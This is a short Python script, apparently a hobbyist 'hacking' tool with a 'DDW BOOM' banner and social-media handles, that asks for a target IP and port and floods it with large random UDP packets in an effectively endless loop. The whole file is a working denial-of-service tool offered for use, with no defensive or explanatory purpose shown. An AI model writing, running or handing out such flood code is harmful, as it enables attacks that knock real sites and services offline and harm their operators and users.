import socket
import random
import time
import pyfiglet
from time import sleep

#--------------------
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m' 
C = '\033[2;35m' 
B = '\033[2;36m' 
Y = '\033[1;34m' 
L = '\033[1;37m' 
#-----------


logo1 = pyfiglet.figlet_format('DDW',font= '3-d')
logo2 = pyfiglet.figlet_format(text='BOOM',font='3-d')
print(f'{F}{logo1}\n{F}{logo2}')

#------
print(f'{Z} El Hacking no es un Delito es una Cultura')

def text(string):
    for Str in string:
        print(Str, end="", flush=True)
        sleep(10 / 1000)

text(f'''{Y} </>
Tiktok: @swipeddw
''')
print(f'{Z}@SwipeWz Telegram')
#------

s_d = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = (input(f'{Z}[+] IP de el Sitio : '))
port = int(input(f'{Z}[+] Puerto : '))
print(f'{C}[+] Ataque en Proceso...')
s_d.connect((ip, port))

time.sleep(1)

for i in range(1, 1000**1000):
    s_d.send(random._urandom(10)*1000)
    try:
        print(f'{F}Enviado : {i} {B}< Sitio : {ip} , Puerto : {port} Enviado >')
        time.sleep(0)
    except:
        print(f'{Z1} Falla {B}< Erorr 400 ! ')
        pass



